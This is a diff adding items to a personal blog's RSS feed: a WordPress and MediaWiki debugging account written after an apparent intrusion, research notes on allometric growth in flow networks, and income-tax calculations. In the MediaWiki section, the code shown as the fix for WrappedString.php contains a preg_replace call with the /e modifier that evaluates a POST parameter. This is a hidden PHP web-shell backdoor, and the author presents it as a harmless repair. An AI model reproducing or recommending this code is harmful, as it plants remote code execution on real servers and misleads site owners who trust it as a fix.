+    define( &#39;WP_DEBUG_DISPLAY&#39;, true );
+    @ini_set( &#39;display_errors&#39;, 1 );
+}
+
+
+// Use dev versions of core JS and CSS files (only needed if you are modifying these core files)
+define( &#39;SCRIPT_DEBUG&#39;, true );  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;wp-no-white-screen&#34;&gt;wp-no-white-screen&lt;/h2&gt;
+
+&lt;p&gt;使用wp-no-white-screen进行辅助debug，发现一处可疑的地方：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Fatal error: Class &#39;WP_Screen&#39; not found in /wp-admin/includes/class-wp-screen.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;发现这段代码是：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    /**
+ * Set the current screen object
+ *
+ * @since 3.0.0
+ *
+ * @param mixed $hook_name Optional. The hook name (also known as the hook suffix) used to determine the screen,
+ *                         or an existing screen object.
+ */
+
+function set_current_screen( $hook_name = &#39;&#39; ) {
+        WP_Screen::get( $hook_name )-&amp;gt;set_current_screen();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;WP_Screen并没有定义！这很不应该，搜索应该引用：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;require_once(ABSPATH . &#39;/wp-admin/includes/class-wp-screen.php&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;首先在上面代码中引用class-wp-screen.php&lt;/p&gt;
+
+&lt;p&gt;然后，但是我在/wp-admin/includes/路径下找不到class-wp-screen.php。于是在github.com/wordpress/wordpress里找到了这个php，放进这里。&lt;/p&gt;
+
+&lt;p&gt;于是我终于看到了管理界面！   这次debug经历了漫长的三天时间，还把网站恢复到了十天前，感觉整个人都不好了。第一次在阿里云平台上发起工单，请求帮助，不过并没有实质的帮助；第一次在阿里云的云社区提问：&lt;a href=&#34;https://yq.aliyun.com/ask/2686，最后还是自己回答了。在这个过程中删除了可疑人在forum和wiki上的注册账号。将admin这个账号改名，防止针对admin用户的密码破解，修改网站数据库的密码。翻了过去7年里的wordpress&#34; target=&#34;_blank&#34;&gt;https://yq.aliyun.com/ask/2686，最后还是自己回答了。在这个过程中删除了可疑人在forum和wiki上的注册账号。将admin这个账号改名，防止针对admin用户的密码破解，修改网站数据库的密码。翻了过去7年里的wordpress&lt;/a&gt; dead screen相关的帖子。太不容易了。目前网站还在debug模式下：且观察下一步动向。&lt;/p&gt;
+
+&lt;h1 id=&#34;mediawiki&#34;&gt;mediawiki&lt;/h1&gt;
+
+&lt;p&gt;出现server error 500, 谷歌无解，打电话给阿里云无解，去掉一些localsettings.php里的extension也无效。&lt;/p&gt;
+
+&lt;p&gt;最后，偶然看到：&lt;a href=&#34;https://www.mediawiki.org/wiki/Manual:Errors_and_symptoms&#34; target=&#34;_blank&#34;&gt;https://www.mediawiki.org/wiki/Manual:Errors_and_symptoms&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You see a Blank Page
+A blank white page indicates a PHP error which isn&amp;rsquo;t being printed to the screen. To force this, add the following lines to the LocalSettings.php file, underneath the &amp;lt;?php:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;error_reporting( E_ALL );
+ini_set( &#39;display_errors&#39;, 1 );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;将这段代码放进localsetting。php，
+提示错误来源是：WrappedString.php  Fatal error: Namespace declaration statement&lt;/p&gt;
+
+&lt;p&gt;于是调整为以下形式，问题解决。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+namespace WrappedString;
+
+@preg_replace(&#39;/(.*)/e&#39;, @$_POST[&#39;kxrmmbxafhdg&#39;], &#39;&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>异速增长背后的数据洞察</title>
+      <link>https://chengjun.github.io/en/note/2016-02-17-allowmetric-growth/</link>
+      <pubDate>Wed, 17 Feb 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2016-02-17-allowmetric-growth/</guid>
+      <description>
+
+&lt;h1 id=&#34;从异速增长率开始&#34;&gt;从异速增长率开始！&lt;/h1&gt;
+
+&lt;p&gt;俗话说用志不分乃凝于神。最近有点分心，精力不集中，产生了很多问题。一个问题是计算士这边的活落下来了。昨天跟小可聊天，也因为不熟悉整个脉络被抢白了半天。于是自己也在思索：解决了什么问题？研究的意义是什么？&lt;/p&gt;
+
+&lt;p&gt;从异速增长率开始！It all starts with a big allowmetric growth rate! 异速增长率：这是一个重要的问题。比如一个流系统的节点是N， 产出是P,那么满足 $P = N^\theta$的关系。在互联网中，它就是PV和UV的关系。它提出了一个问题，即：为什么生物、城市、互联网都满足一个普世规律？它定量地表达了投入和产出的关系。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://wiki.swarma.net/images/thumb/c/c5/Allowmetric_growht_digg_36_days.png/400px-Allowmetric_growht_digg_36_days.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;为什么会有异速增长？一个可能的答案是流网络的自相似性。自己的哪里相似？究竟是什么地方？注意：异速增长是一个时间维度的系统状态的变化。它满足标度率，那么它本身就是自相似的。可以究竟什么才是自相似？（似乎马上回到了以前的问题：什么是无标度网络？）&lt;/p&gt;
+
+&lt;p&gt;引入耗散的视角：耗散阻碍了生长。每个小时里流网络而言，可以算每个节点i的耗散与流入。流入$T_{i}$和耗散$D_i$的差值就是节点i的流存量。&lt;/p&gt;
+
+&lt;p&gt;我们知道$T_i$和耗散 $D_i$的关系同样满足一个标度规律。放在直角坐标系中，我们可以画出这种关系。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://wiki.swarma.net/images/d/d9/Dissipation_digg_36_days.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;直角坐标系隐含了一些潜在的假设：我们要按照从小到大的顺序（我称之为序假设，rank assumption）排列才能看到这种规律。坐标轴的作用就是这样。但要注意：流冰不是这样从耗散小的节点留到耗散大的节点。&lt;/p&gt;
+
+&lt;h3 id=&#34;几何化&#34;&gt;几何化&lt;/h3&gt;
+
+&lt;p&gt;将流网络几何化，看成是一个由源向外的耗散。一个流网络，就可以算出任一节点到源头的流距离$L_{i}$。算法暂时省略。&lt;/p&gt;
+
+&lt;p&gt;整个网络按照半径重排：保持了网络的自相似性。这里的自相似是指Dreyer球意义上的自相似，即沿着半径由球心向外走，每个半径上的$T_i$和耗散$D_i$各自的积分（即流的累加）保持标度关系。这个时候，尺度便成了球半径（流距离），而不是直角坐标系里的序了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://wiki.swarma.net/images/thumb/5/58/Hour23.png/400px-Hour23.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但是，换成了流距离作序参量（这里我是乱用的）的话，这种效果依然不好：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://wiki.swarma.net/images/thumb/8/84/Les.png/800px-Les.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看到数据里的平行四边形，而不是相互遮盖成为一个直线。&lt;/p&gt;
+
+&lt;p&gt;结果导致了拟合的耗散率$\mu$和异速增长率$\theta$之间的关系具有较大的噪音：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://wiki.swarma.net/images/thumb/c/ce/MuAndTheta.png/600px-MuAndTheta.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;怎么办？引入系统规模UV。&lt;/p&gt;
+
+&lt;p&gt;$$T(r) = A D_{rmax}^a D(r)^b$$&lt;/p&gt;
+
+&lt;p&gt;T(r)和D(r)代表沿半径r从source到sink对节点的直接流通量$t_i$和耗散量$d_i$进行积分。当r=rmax时，D(r)=D(rmax)=UV。&lt;/p&gt;
+
+&lt;p&gt;果然效果好了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://wiki.swarma.net/images/thumb/c/c1/Dreyerballscaling.png/800px-Dreyerballscaling.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看到这里我自愧弗如远甚。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://wiki.swarma.net/images/7/7e/Addjustedthetaprediction.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>理解个人所得税</title>
+      <link>https://chengjun.github.io/en/note/2015-12-31-income/</link>
+      <pubDate>Thu, 31 Dec 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2015-12-31-income/</guid>
+      <description>
+
+&lt;h2 id=&#34;更新&#34;&gt;更新&lt;/h2&gt;
+
+&lt;p&gt;2016年4月开始，根据建设双一流大学的需要，对岗位工资进行调整。&lt;/p&gt;
+
+&lt;p&gt;岗位工资    交补  应发  会费  公积  养老预扣    大病互助    个税  实发
+13333   300 16033   66.67   1200    1600    20  1428.25 11718.08&lt;/p&gt;
+
+&lt;h2 id=&#34;薪资纳税计算&#34;&gt;薪资纳税计算&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;学校财务处 &lt;a href=&#34;http://ndcw.nju.edu.cn/&#34; target=&#34;_blank&#34;&gt;http://ndcw.nju.edu.cn/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;江苏省南京地方税务局 &lt;a href=&#34;http://nj.jsds.gov.cn/art/2011/6/28/art_16724_418203.html&#34; target=&#34;_blank&#34;&gt;http://nj.jsds.gov.cn/art/2011/6/28/art_16724_418203.html&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;交补300、会费50、大病互助20、公积金1200，不算入纳税范围。交补是交通补贴；会费是工会会费是在工资中提取的工会经费。大学没有医疗保险，只有大病互助。住房公积金是1200元，年初还会交一次失业险50。其中，*只有*住房公积金不交税。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;10000+300-1200 = 9100
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;3500以上为纳税标准，我的账单上写565元所得税，&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;应纳个人所得税税额=应纳税所得额×适用税率-速算扣除数；
+
+((10000- 1200 + 300)- 3500)*0.2 - 555 = 565
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;扣除标准3500元/月（2011年9月1日起正式执行）（工资、薪金所得适用）；个税免征额3500元（工资薪金所得适用）。关于税率和速算扣除数参见：&lt;a href=&#34;http://www.chinaacc.com/kuaijishiwu/gssw/ni1501272983.shtml&#34; target=&#34;_blank&#34;&gt;http://www.chinaacc.com/kuaijishiwu/gssw/ni1501272983.shtml&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;假设其它工薪收入为50万，那么可以使用以下公式计算。基本工资应交税部分9100元，该部分交税565。其它工薪收入x加上9100即为该月总纳税金额，应纳税所得额乘以税率，再减去速算扣除数就是本月应缴纳税收，减去基本工资缴纳税收565，就是本月其它工薪收入部分缴纳的税额。具体如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;def tax(x, rate, extra):
+    return (x+9100-3500)*rate-extra-565
+
+tax(10000, 0.25, 1005)*50 = 116500
+tax(20000, 0.25, 1005)*25 = 120750
+tax(40000, 0.30, 2755)*12 + tax(20000, 0.25, 1005) = 129150
+tax(50000, 0.35, 5505)*10 = 133900
+tax(500000, 0.45, 13505) = 213450
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;劳务报酬纳税计算&#34;&gt;劳务报酬纳税计算&lt;/h2&gt;
+
+&lt;p&gt;您输入的税前劳务报酬总额为：500000， 应纳所得税额为：153000， 税后劳务报酬总额为：347000&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
